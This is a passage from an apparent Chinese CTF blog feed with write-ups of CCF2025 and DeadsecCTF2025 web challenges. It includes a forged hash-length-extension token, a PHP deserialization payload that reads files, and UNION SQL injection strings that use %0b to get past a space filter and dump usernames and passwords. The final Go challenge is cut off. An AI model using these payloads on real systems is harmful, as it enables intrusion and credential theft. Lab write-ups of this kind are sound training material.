    <content type="html"><![CDATA[<h2 id="easylogin"><a href="#easylogin" class="headerlink" title="easylogin"></a>easylogin</h2><p>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params"><span class="variable">$salt</span>, <span class="variable">$message</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$salt</span> == <span class="string">&quot;&quot;</span> || <span class="variable">$message</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s.%s&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$message</span>), <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span> . <span class="variable">$message</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateToken</span>(<span class="params"><span class="variable">$token</span>, <span class="variable">$salt</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$payload</span>, <span class="variable">$hash</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$token</span>);</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$payload</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span> . <span class="variable">$message</span>) == <span class="variable">$hash</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$message</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="variable">$salt</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;salt&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$salt</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$salt</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;salt&quot;</span>] = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">    <span class="variable">$defaultToken</span> = <span class="title function_ invoke__">generateToken</span>(<span class="variable">$salt</span>, <span class="string">&quot;guest&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;token&quot;</span>, <span class="variable">$defaultToken</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$token</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;token&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$greeting</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$token</span> &amp;&amp; <span class="variable">$token</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">validateToken</span>(<span class="variable">$token</span>, <span class="variable">$salt</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$message</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$greeting</span> = <span class="string">&quot;Wellcome: &quot;</span> . <span class="variable">$message</span> . PHP_EOL;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$message</span> !== <span class="string">&quot;guest&quot;</span>) &#123;            </span><br><span class="line">            <span class="variable">$greeting</span> .= <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$greeting</span> = <span class="string">&quot;Login failure.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>uniqid()</code>生成的<code>$salt</code>固定为13位，直接hash长度拓展攻击即可，网上有的脚本</p><p><a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><p><img src="/../images/achieve/2025/8/CCF2025/1.png" alt="1"></p><p><img src="/../images/achieve/2025/8/CCF2025/2.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Z3Vlc3SAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAAAAAYWRtaW4=.fdda2e231c688be38eeebdbe1031c19a</span><br></pre></td></tr></table></figure><h2 id="serp"><a href="#serp" class="headerlink" title="serp"></a>serp</h2><p>git泄露，用githacker恢复失败了，用lazygit成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r http://124.133.253.44:33147/.git</span><br></pre></td></tr></table></figure><p><a href="https://github.com/jesseduffield/lazygit">https://github.com/jesseduffield/lazygit</a></p><p>把exe放在<code>git</code>目录下双击运行即可，查看commit发现应该是要读取<code>f1a9.php</code></p><p><img src="/../images/achieve/2025/8/CCF2025/QQ20250802-210844.jpg" alt="1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./posts.php&quot;</span>);</span><br><span class="line"><span class="variable">$posts</span>=[<span class="keyword">new</span> <span class="title class_">Post</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>)];</span><br><span class="line"><span class="variable">$posts</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">strval</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;posts&quot;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;post&quot;</span>])&#123;</span><br><span class="line">    <span class="variable">$post</span>=(<span class="keyword">new</span> <span class="title class_">Maker</span>(<span class="string">&quot;Post&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;post&quot;</span>]))-&gt;<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">    <span class="variable">$posts</span>[]=<span class="variable">$post</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;posts&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$posts</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//posts.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$title</span>, <span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title=<span class="variable">$title</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;title. <span class="string">&quot;/&quot;</span> . <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Maker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$model</span> = <span class="string">&quot;Post&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>=[<span class="string">&quot;Title&quot;</span>,<span class="string">&quot;Contents&quot;</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span>,<span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;model=<span class="variable">$model</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args=<span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;obj==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;obj=<span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(...<span class="variable">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;object(&quot;</span>. <span class="variable language_">$this</span>-&gt;model.<span class="string">&quot;)&#123;&quot;</span>. <span class="title function_ invoke__">strval</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getInstance</span>()) .<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj=<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单反序列化，直接打就可以了，这里的唯一细节是<code>...$this-&gt;args</code>，会使得你传入的数组变成正常的两个参数，但是我始终做不出来，后面发现我其实是少了一段关键代码</p><p><img src="/../images/achieve/2025/8/CCF2025/QQ20250802-211911.jpg" alt="1"></p><p>这里会触发<code>__toString()</code>，那么就有办法来进行反序列化了</p><p><img src="/../images/achieve/2025/8/CCF2025/QQ20250802-212549.jpg" alt="1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$title</span>, <span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$title</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot;/&quot;</span> . <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Maker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$model</span> = <span class="string">&quot;Post&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span> = [<span class="string">&quot;Title&quot;</span>, <span class="string">&quot;Contents&quot;</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span>, <span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;model = <span class="variable">$model</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(...<span class="variable">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;object(&quot;</span>. <span class="variable language_">$this</span>-&gt;model .<span class="string">&quot;)&#123;&quot;</span> . <span class="title function_ invoke__">strval</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getInstance</span>()) . <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Maker</span>(<span class="string">&#x27;SplFileObject&#x27;</span>,[<span class="string">&#x27;f1a9.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Maker</span>(<span class="string">&#x27;SplFileObject&#x27;</span>,[<span class="string">&#x27;index.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line"><span class="variable">$b</span> = [<span class="keyword">new</span> <span class="title class_">Post</span>(<span class="variable">$a</span>,<span class="variable">$c</span>)];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/CCF2025/QQ20250802-213248.jpg" alt="1"></p>]]></content>
    
    
    <summary type="html">nop带我玩</summary>
    
    
    
    <category term="赛题" scheme="https://baozongwi.xyz/categories/%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="php" scheme="https://baozongwi.xyz/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>DeadsecCTF2025</title>
    <link href="https://baozongwi.xyz/posts/51025.html"/>
    <id>https://baozongwi.xyz/posts/51025.html</id>
    <published>2025-07-28T02:13:44.000Z</published>
    <updated>2025-08-08T04:00:30.753Z</updated>
    
    <content type="html"><![CDATA[<p>我只能说这个比赛太牛了，短短的代码，大大的姿势！</p><h2 id="Arcadia（5-solves）"><a href="#Arcadia（5-solves）" class="headerlink" title="Arcadia（5 solves）"></a>Arcadia（5 solves）</h2><p>黑盒题，正常注册网站之后观察文章，发现写的很多是布尔什么什么的，这里进行普通的注入查询发现会返回如下界面</p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/QQ20250728-101628.jpg" alt="1"></p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/QQ20250728-101952.jpg" alt="1"></p><p>到这里就可以确认是在这里注入了，但是有点小问题，测试了一下，很多绕过空格的方式都没了，至少我已知的是没了，最后是用<code>%0b</code>，垂直制表符成功的，并且还有个小细节，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and union </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="literal">false</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure><p>一个是条件语句，要前后都为真，而后面这个是只需要看后面的查询语句，前面恒定为假。</p><p>而看着好像是等效的哈，但是现在后端如果是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> $id <span class="operator">=</span>$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br></pre></td></tr></table></figure><p>像这种情况，就必须要<code>and false</code>了。</p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/QQ20250728-103656.jpg" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%0Band%0Bfalse%0Bunion%0Bselect%0B1,2,3%0Band&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>接下来正常查询即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%0Band%0Bfalse%0Bunion%0Bselect%0B1,database(),3%0Band&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">arcadia</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0Band%0Bfalse%0Bunion%0Bselect%0B1,group_concat(table_name),3%0Bfrom%0Binformation_schema.tables%0Bwhere%0Btable_schema=database()%0Band&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">articles,users</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0Band%0Bfalse%0Bunion%0Bselect%0B1,group_concat(column_name),3%0Bfrom%0Binformation_schema.columns%0Bwhere%0Btable_name=&#x27;</span>articles<span class="string">&#x27;%0Band&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">id,title,body,author_id,created_at</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0Band%0Bfalse%0Bunion%0Bselect%0B1,group_concat(column_name),3%0Bfrom%0Binformation_schema.columns%0Bwhere%0Btable_name=&#x27;</span>users<span class="string">&#x27;%0Band&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">id,username,password</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0Band%0Bfalse%0Bunion%0Bselect%0B1,group_concat(username),3%0Bfrom%0Busers%0Bwhere%0B&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">admin,baozongwi,John,Uzun</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0Band%0Bfalse%0Bunion%0Bselect%0B1,group_concat(password),3%0Bfrom%0Busers%0Bwhere%0B&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">.XA<span class="operator">/</span><span class="number">9</span>G9k87rR,d2Z20#<span class="number">7</span>r<span class="operator">=</span>oaW,DEAD&#123;wh0_n33ds_$p4c3s_FTW<span class="operator">!</span><span class="operator">!</span>_fc18fc69b5fb3e63&#125;,Baozongwi123<span class="operator">!</span></span><br></pre></td></tr></table></figure><p>拿到flag，还是挺不错的一道题</p><h2 id="go-fish（17-solves）"><a href="#go-fish（17-solves）" class="headerlink" title="go-fish（17 solves）"></a>go-fish（17 solves）</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> RequestBody <span class="keyword">struct</span> &#123;</span><br><span class="line">Req <span class="type">string</span> <span class="string">`json:&quot;request&quot;`</span></span><br><span class="line">Username <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span></span><br><span class="line">Password <span class="type">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">Token <span class="type">string</span> <span class="string">`json:&quot;token&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">goHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Received request from %s: %s %s&quot;</span>, r.RemoteAddr, r.Method, r.URL.Path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Method Not Allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line">log.Printf(<span class="string">&quot;Rejected: Method %s not allowed&quot;</span>, r.Method)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(r.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error reading request body&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">log.Printf(<span class="string">&quot;Error reading body: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> r.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reqBody RequestBody</span><br><span class="line">err = json.Unmarshal(body, &amp;reqBody)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprint(w, <span class="string">&quot;Error!&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reqBody.Req == <span class="string">&quot;givemeflagpls&quot;</span> &#123;</span><br><span class="line">flagContent, err := os.ReadFile(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error reading flag file, please contact admins&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprint(w, <span class="type">string</span>(flagContent))</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> reqBody.Req == <span class="string">&quot;login&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> reqBody.Username == <span class="string">&quot;admin&quot;</span> &amp;&amp; reqBody.Password != reqBody.Password &#123;</span><br><span class="line">fmt.Fprint(w, reqBody.Token)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Fprint(w, <span class="string">&quot;Wrong username and/or password&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Unknown action&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/go&quot;</span>, goHandler)</span><br><span class="line">port := <span class="string">&quot;:8080&quot;</span></span><br><span class="line">log.Printf(<span class="string">&quot;Golang server starting on port %s&quot;</span>, port)</span><br><span class="line">log.Fatal(http.ListenAndServe(port, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就两个路由非常轻巧，在login路由有一个看似非常安全的地方</p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/QQ20250728-110127.jpg" alt="1"></p><p>我不等于我？！</p><p>查到go里面的NaN可以做到类似的事情，只要类型正确，但是这里是字符串类型，不太对感觉</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 